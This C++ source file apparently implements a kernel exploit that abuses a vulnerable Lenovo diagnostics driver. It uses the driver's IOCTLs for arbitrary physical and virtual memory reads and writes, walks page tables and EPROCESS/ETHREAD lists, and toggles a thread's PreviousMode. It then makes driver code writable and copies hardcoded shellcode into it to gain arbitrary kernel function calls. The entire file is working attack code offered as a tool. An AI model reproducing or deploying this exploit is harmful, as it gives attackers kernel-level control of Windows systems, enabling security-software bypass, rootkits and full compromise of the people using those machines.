#include "LenovoMemoryMgr.h"
#include "EzPdb.h"
#include <conio.h>
#include <iostream>

UINT64 LenovoMemoryMgr::CallKernelFunction(UINT64 address, UINT64 arg1, UINT64 arg2, UINT64 arg3, UINT64 arg4)
{
	if (!address) 
	{
		return -1;
	}

	CALL_DATA call_data;
	memset(&call_data, 0, sizeof(call_data));

	UINT64 call_result = 0;

	call_data.FunctionAddr = address;
	call_data.Arg1 = arg1;
	call_data.Arg2 = arg2;
	call_data.Arg3 = arg3;
	call_data.Arg4 = arg4;
	call_data.CallResult0 = reinterpret_cast<UINT64>(&call_result);
	
	DWORD dwBytesReturned = 0;

	DeviceIoControl
	(
		hDevice,
		0x222000,
		&call_data,
		sizeof(CALL_DATA),
		&call_data,
		sizeof(CALL_DATA),
		&dwBytesReturned,
		NULL
	);

	return call_result;
}

template <typename T>
requires(sizeof(T) == 1 || sizeof(T) == 2 || sizeof(T) == 4 || sizeof(T) == 8)
BOOL LenovoMemoryMgr::ReadPhysData(UINT64 address, T* data)
{
    if (!data) 
	{
        return FALSE;
    }

	LDIAG_READ lr = { 0 };
	BOOL bStatus = FALSE;
	DWORD dwBytesReturned = 0;
	DWORD64 outbuffer = 0;

	lr.data = address;
	lr.wLen = sizeof(DWORD64);

	bStatus = DeviceIoControl(
		hDevice,
		IOCTL_PHYS_RD,
		&lr,
		sizeof(LDIAG_READ),
		&outbuffer,
		sizeof(DWORD64),
		&dwBytesReturned,
		NULL
	);

	if (!bStatus) {
		return FALSE;
	}

	*data = (T)outbuffer;
    return TRUE;
}

template<typename T>
requires(sizeof(T) == 1 || sizeof(T) == 2 || sizeof(T) == 4 || sizeof(T) == 8)
BOOL LenovoMemoryMgr::WritePhysData(_In_ UINT64 PhysDest, _In_ T* data)
{
	if (!data && !PhysDest) 
	{
		return FALSE;
	}

	NTSTATUS status = 0;
	BOOL bRes = FALSE;
	LDIAG_WRITE lw = { 0 };
	DWORD dwBytesReturned = 0;

	lw._where = PhysDest;
	lw._what_ptr = (DWORD64)data;
	lw.dwMapSize = (DWORD)sizeof(T);
	lw.dwLo = 0x6C61696E;

	status = DeviceIoControl(
		hDevice,
		IOCTL_PHYS_WR,
		&lw,
		sizeof(LDIAG_WRITE),
		NULL,
		0,
		&dwBytesReturned,
		NULL
	);

	return NT_SUCCESS(status);
}

template<typename T>
requires(sizeof(T) == 1 || sizeof(T) == 2 || sizeof(T) == 4 || sizeof(T) == 8)
BOOL LenovoMemoryMgr::ReadVirtData(UINT64 address, T* data)
{
	if (!data) {
		return FALSE;
	}

	if (!WritePhysData(physSwapAddr, (T*)address)) {
		return FALSE;
	}

	return ReadPhysData(physSwapAddr, data);
}

template<typename T>
requires(sizeof(T) == 1 || sizeof(T) == 2 || sizeof(T) == 4 || sizeof(T) == 8)
BOOL LenovoMemoryMgr::WriteVirtData(UINT64 address, T* data)
{
	if (!data) {
		return FALSE;
	}

	PAGE_TABLE_ENTRY pte = { 0 };
	PFILL_PTE_HIERARCHY PteHierarchy = CreatePteHierarchy(address);

	PageType pt = GetPageTypeForVirtualAddress(address, &pte);
	UINT64 PhysAddr = VtoP(address, pte.flags.Pfn, pt);

	return WritePhysData(PhysAddr, data);
}

// https://github.com/ch3rn0byl/CVE-2021-21551/blob/master/CVE-2021-21551/DellBiosUtil.cpp
PFILL_PTE_HIERARCHY LenovoMemoryMgr::CreatePteHierarchy(UINT64 VirtualAddress)
{
	PFILL_PTE_HIERARCHY retval = new FILL_PTE_HIERARCHY;

	///
	/// Resolve the PTE address
	/// 
	VirtualAddress >>= 9;
	VirtualAddress &= 0x7FFFFFFFF8;
	VirtualAddress += PteBase;

	retval->PTE = VirtualAddress;

	///
	/// Resolve the PDE address
	/// 
	VirtualAddress >>= 9;
	VirtualAddress &= 0x7FFFFFFFF8;
	VirtualAddress += PteBase;

	retval->PDE = VirtualAddress;

	///
	/// Resolve the PPE address
	/// 
	VirtualAddress >>= 9;
	VirtualAddress &= 0x7FFFFFFFF8;
	VirtualAddress += PteBase;

	retval->PPE = VirtualAddress;

	///
	/// Resolve the PXE address
	/// 
	VirtualAddress >>= 9;
	VirtualAddress &= 0x7FFFFFFFF8;
	VirtualAddress += PteBase;

	retval->PXE = VirtualAddress;

	return retval;
}

UINT64 LenovoMemoryMgr::FindPhysSwapSpace()
{
	UINT64 begin = 0x1000;
	UINT64 end = 0x10000;
	BOOL bRes = FALSE;
	UINT64 val = 0;
	while (begin < end) {
		bRes = ReadPhysData<UINT64>(begin, &val);
		if (!bRes) {
			return NULL;
		}

		if (!val) {
			return begin;
		}

		begin += 8;
	}
	return NULL;
}

UINT64 LenovoMemoryMgr::GetPteBase()
{
	const auto address = NtosBase + mi_get_pte_address_offset + 0x13;
	UINT64 qwPteBase = 0;

	ReadVirtData(address, &qwPteBase);

	return qwPteBase;
}

UINT64 LenovoMemoryMgr::VtoP(UINT64 va, UINT64 index, PageType p)
{
	switch (p) {
	case PageType::UsePte:
		va &= 0xfff;
		break;
	case PageType::UsePde:
		va &= 0x1fffff;
		break;
	default:
		return 0;
	}
	return (index << 12) + va;
}

PageType LenovoMemoryMgr::GetPageTypeForVirtualAddress(UINT64 VirtAddress, PPAGE_TABLE_ENTRY PageTableEntry)
{
	// fill the pte hierarchy for the virtual address
	PFILL_PTE_HIERARCHY hierarchy = CreatePteHierarchy(VirtAddress);

	// read the PTE contents, if they are zero we are using large pages
	// if the PDE is also zero, god help you
	ReadVirtData<UINT64>(hierarchy->PTE, &PageTableEntry->value);

	if (!PageTableEntry->value) 
	{
		ReadVirtData<UINT64>(hierarchy->PDE, &PageTableEntry->value);
		return PageType::UsePde;
	}

	return PageType::UsePte;
}

UINT64 LenovoMemoryMgr::FindNtosBase()
{
	UINT64 retval = 0;
	HANDLE hHeap = GetProcessHeap();
	LPVOID lpHeapBuffer = HeapAlloc(hHeap, 0, 0x2000);
	DWORD dwBytesReturned = 0;

	if (!lpHeapBuffer) {
		return NULL;
	}

	NTSTATUS status = NtQuerySystemInformation(
		(SYSTEM_INFORMATION_CLASS)SYS_INFO_CLASS_MODULE_INFO,
		lpHeapBuffer,
		0x2000,
		&dwBytesReturned
	);

	// realloc and try again
	// todo: add switch case for status
	if (!NT_SUCCESS(status)) {
		HeapFree(hHeap, 0, lpHeapBuffer);
		lpHeapBuffer = HeapAlloc(hHeap, 0, dwBytesReturned);

		if (!lpHeapBuffer) {
			return NULL;
		}

		status = NtQuerySystemInformation(
			(SYSTEM_INFORMATION_CLASS)SYS_INFO_CLASS_MODULE_INFO,
			lpHeapBuffer,
			dwBytesReturned,
			&dwBytesReturned
		);

		if (!NT_SUCCESS(status)) {
			return NULL;
		}
	}

	PSYSTEM_MODULE_INFORMATION psm = (PSYSTEM_MODULE_INFORMATION)lpHeapBuffer;
	if (psm->ModulesCount > 0) {
		retval = (UINT64)psm->Modules[0].ImageBase;
		HeapFree(hHeap, 0, lpHeapBuffer);
		return retval;
	}

	return NULL;
}

/*
		Todo: ensure our reads aren't crossing a page boundary
*/
_Use_decl_annotations_
UINT64 LenovoMemoryMgr::FindBase(const char* image_name)
{
	UINT64 retval = 0;
	HANDLE hHeap = GetProcessHeap();
	LPVOID lpHeapBuffer = HeapAlloc(hHeap, 0, 0x2000);
	DWORD dwBytesReturned = 0;

	if (!lpHeapBuffer) {
		return NULL;
	}

	NTSTATUS status = NtQuerySystemInformation(
		(SYSTEM_INFORMATION_CLASS)SYS_INFO_CLASS_MODULE_INFO,
		lpHeapBuffer,
		0x2000,
		&dwBytesReturned
	);

	// realloc and try again
	// todo: add switch case for status
	if (!NT_SUCCESS(status)) {
		HeapFree(hHeap, 0, lpHeapBuffer);
		lpHeapBuffer = HeapAlloc(hHeap, 0, dwBytesReturned);

		if (!lpHeapBuffer) {
			return NULL;
		}

		status = NtQuerySystemInformation(
			(SYSTEM_INFORMATION_CLASS)SYS_INFO_CLASS_MODULE_INFO,
			lpHeapBuffer,
			dwBytesReturned,
			&dwBytesReturned
		);

		if (!NT_SUCCESS(status)) {
			return NULL;
		}
	}

	PSYSTEM_MODULE_INFORMATION psm = (PSYSTEM_MODULE_INFORMATION)lpHeapBuffer;
	if (psm->ModulesCount > 0) {

		for (int i = 0; i < psm->ModulesCount; i++)
		{
			if (strstr(psm->Modules[i].ImageName, image_name))
			{
				retval = (UINT64)psm->Modules[i].ImageBase;
				break;
			}
		}

		HeapFree(hHeap, 0, lpHeapBuffer);
		return retval;
	}

	return NULL;
}

UINT64 LenovoMemoryMgr::GetPsInitialSystemProc()
{
	HMODULE hNtos = LoadLibraryA("ntoskrnl.exe");
	if (!hNtos) {
		return NULL;
	}

	PVOID initial_proc = GetProcAddress(hNtos, "PsInitialSystemProcess");
	initial_proc = (PVOID)(((SIZE_T)initial_proc - (SIZE_T)hNtos) + (SIZE_T)NtosBase);
	FreeLibrary(hNtos);
	return (UINT64)initial_proc;
}

UINT64 LenovoMemoryMgr::GetKernelExport(const char* function_name)
{
	HMODULE hNtos = LoadLibraryA("ntoskrnl.exe");
	if (!hNtos) {
		return NULL;
	}

	PVOID initial_proc = GetProcAddress(hNtos, function_name);
	initial_proc = (PVOID)(((SIZE_T)initial_proc - (SIZE_T)hNtos) + (SIZE_T)NtosBase);
	FreeLibrary(hNtos);
	return (UINT64)initial_proc;
}

BOOL LenovoMemoryMgr::SearchEprocessLinksForPid(UINT64 Pid, UINT64 SystemEprocess, PUINT64 lpTargetProcess)
{
	BOOL bRes = FALSE;
	if (!lpTargetProcess) {
		return FALSE;
	}

	UINT64 ListIter = SystemEprocess + process_active_process_links_offset;
	UINT64 ListHead = ListIter;

	while (TRUE) 
	{
		bRes = ReadVirtData((ListIter + 0x8), &ListIter);

		if (!bRes) 
		{
			return FALSE;
		}

		if (ListIter == ListHead) 
		{
			return FALSE;
		}

		UINT64 IterEprocessBase = ListIter - process_active_process_links_offset;
		UINT64 IterPid = 0;

		bRes = ReadVirtData((IterEprocessBase + process_pid_offset), &IterPid);

		if (!bRes) 
		{
			return FALSE;
		}

		if (IterPid == Pid) 
		{
			*lpTargetProcess = IterEprocessBase;
			return TRUE;
		}
	}
}

UINT64 LenovoMemoryMgr::GetPreviousModeAddress()
{
	const auto system_process_ptr = GetPsInitialSystemProc();
	UINT64 system_process = 0;
	ReadVirtData(system_process_ptr, &system_process);

	UINT64 current_process = 0;

	if (SearchEprocessLinksForPid(GetCurrentProcessId(), system_process, &current_process))
	{
		auto thread_head_list = current_process + process_thread_head_list_offset;

		UINT64 ListIter = thread_head_list;
		UINT64 ListHead = ListIter;

		while (TRUE) 
		{
			auto bRes = ReadVirtData((ListIter + 0x8), &ListIter);

			if (!bRes) 
			{
				break;
			}

			if (ListIter == ListHead) 
			{
				break;
			}

			UINT64 iter_thread = ListIter - thread_list_entry_offset;
			UINT64 IterTid = 0;

			bRes = ReadVirtData((iter_thread + thread_id_offset), &IterTid);
			
			if (GetCurrentThreadId() == IterTid)
			{
				return iter_thread + thread_previous_mode_offset;
			}
		}
	}

	return 0;
}

UINT64 LenovoMemoryMgr::GetPageTableInfo(UINT64 address, PAGE_TABLE_ENTRY& entry)
{
	if (!address) return 0;

	PAGE_TABLE_ENTRY pte = { 0 };
	PFILL_PTE_HIERARCHY PteHierarchy = CreatePteHierarchy(address);

	PageType pt = GetPageTypeForVirtualAddress(address, &pte);
	entry = pte;

	if (pt == UsePte)
	{
		return PteHierarchy->PTE;
	}
	else if (pt == UsePde)
	{
		return PteHierarchy->PDE;
	}

	return 0;
}

BOOL LenovoMemoryMgr::WritePageTable(UINT64 page_table_address, PAGE_TABLE_ENTRY entry)
{
	NTSTATUS status = 0;
	BOOL bRes = FALSE;

	const auto ldiagd_address = FindBase(driver_name_str.c_str());
	const auto address = ldiagd_address + 0x4100;

	WriteVirtData(address, &entry.value);

	PAGE_TABLE_ENTRY pte = { 0 };
	PFILL_PTE_HIERARCHY PteHierarchy = CreatePteHierarchy(address);

	PageType pt = GetPageTypeForVirtualAddress(address, &pte);
	UINT64 PhysAddr = VtoP(address, pte.flags.Pfn, pt);

	LDIAG_READ lr = { 0 };
	BOOL bStatus = FALSE;
	DWORD dwBytesReturned = 0;

	lr.data = PhysAddr;
	lr.wLen = sizeof(DWORD64);

	const auto prev_mode_address = GetPreviousModeAddress();

	uint8_t previous_mode = 0;
	WriteVirtData(prev_mode_address, &previous_mode);

	bStatus = DeviceIoControl
	(
		hDevice,
		IOCTL_PHYS_RD,
		&lr,
		sizeof(LDIAG_READ),
		reinterpret_cast<void*>(page_table_address),
		sizeof(DWORD64),
		&dwBytesReturned,
		NULL
	);

	previous_mode = 1;
	WriteVirtData(prev_mode_address, &previous_mode);

	return status;
}

BOOL LenovoMemoryMgr::Init(std::string driver_name)
{
	driver_name_str = driver_name;

    HANDLE hDev = CreateFileA
	(
        strDeviceName,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hDev == NULL || hDev == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

	NtosBase = FindNtosBase();
    hDevice = hDev;
	physSwapAddr = FindPhysSwapSpace();

#ifdef USE_STATIC_OFFSETS

	process_active_process_links_offset = OFFSET_EPROCESS_LINKS;
	process_pid_offset = OFFSET_EPROCESS_PID;
	process_thread_head_list_offset = OFFSET_EPROCESS_THREAD_HEAD_LIST;

	thread_id_offset = OFFSET_ETHREAD_ID;
	thread_previous_mode_offset = OFFSET_ETHREAD_PREVIOUS_MODE;
	thread_list_entry_offset = OFFSET_ETHREAD_LIST_ENTRY;

	mi_get_pte_address_offset = OFFSET_MI_GET_PTE_ADDRESS;
	mm_allocate_independent_pages_offset = OFFSET_MM_ALLOCATE_INDEPENDENT_PAGES;
	mm_set_page_protection_offset = OFFSET_MM_SET_PAGE_PROTECTION;

#else

	std::string kernel = std::string(std::getenv("systemroot")) + "\\System32\\ntoskrnl.exe";
	std::string pdbPath = EzPdbDownload(kernel);

	if (pdbPath.empty())
	{
		std::cout << "download pdb failed " << GetLastError() << std::endl;;
		return FALSE;
	}

	EZPDB pdb;

	if (!EzPdbLoad(pdbPath, &pdb))
	{
		std::cout << "load pdb failed " << GetLastError() << std::endl;
		return FALSE;
	}

	process_active_process_links_offset = EzPdbGetStructPropertyOffset(&pdb, "_EPROCESS", L"ActiveProcessLinks");
	process_pid_offset = EzPdbGetStructPropertyOffset(&pdb, "_EPROCESS", L"UniqueProcessId");
	process_thread_head_list_offset = EzPdbGetStructPropertyOffset(&pdb, "_EPROCESS", L"ThreadListHead");

	thread_id_offset = EzPdbGetStructPropertyOffset(&pdb, "_ETHREAD", L"Cid") + 0x8;
	thread_previous_mode_offset = EzPdbGetStructPropertyOffset(&pdb, "_KTHREAD", L"PreviousMode");
	thread_list_entry_offset = EzPdbGetStructPropertyOffset(&pdb, "_ETHREAD", L"ThreadListEntry");

	mi_get_pte_address_offset = EzPdbGetRva(&pdb, "MiGetPteAddress");
	mm_allocate_independent_pages_offset = EzPdbGetRva(&pdb, "MmAllocateIndependentPages");
	mm_set_page_protection_offset = EzPdbGetRva(&pdb, "MmSetPageProtection");

	EzPdbUnload(&pdb);

#endif

	PteBase = GetPteBase();

	const auto ldiagd_address = FindBase(driver_name_str.c_str());
	const auto address = ldiagd_address + 0x1200;

	PAGE_TABLE_ENTRY entry;
	const auto page_table_address = GetPageTableInfo(address, entry);

	entry.flags.ReadWrite = 1;

	WritePageTable(page_table_address, entry);

	UINT8 shellcode[] =
	{
		0x4C, 0x89, 0x44, 0x24, 0x18, 0x48, 0x89, 0x54, 0x24, 0x10, 0x48, 0x89,
		0x4C, 0x24, 0x08, 0x48, 0x83, 0xEC, 0x38, 0x48, 0x8B, 0x44, 0x24, 0x40,
		0x48, 0x8B, 0x40, 0x18, 0x48, 0x89, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x44,
		0x24, 0x20, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0x8B,
		0x44, 0x24, 0x20, 0x4C, 0x8B, 0x48, 0x20, 0x48, 0x8B, 0x44, 0x24, 0x20,
		0x4C, 0x8B, 0x40, 0x18, 0x48, 0x8B, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x50,
		0x10, 0x48, 0x8B, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x48, 0x08, 0xFF, 0x54,
		0x24, 0x28, 0x48, 0x8B, 0x4C, 0x24, 0x20, 0x48, 0x8B, 0x49, 0x28, 0x48,
		0x89, 0x01, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0xCC, 0xCC, 0xCC,
		0xCC, 0xCC, 0xCC, 0xCC
	};

	for (int i = 0; i < sizeof(shellcode); i += 8)
	{
		WriteVirtData(address + i, reinterpret_cast<UINT64*>(reinterpret_cast<UINT64>(&shellcode) + i));
	}

    return TRUE;
}

BOOL LenovoMemoryMgr::Shutdown()
{
    CloseHandle(hDevice);
    return 0;
}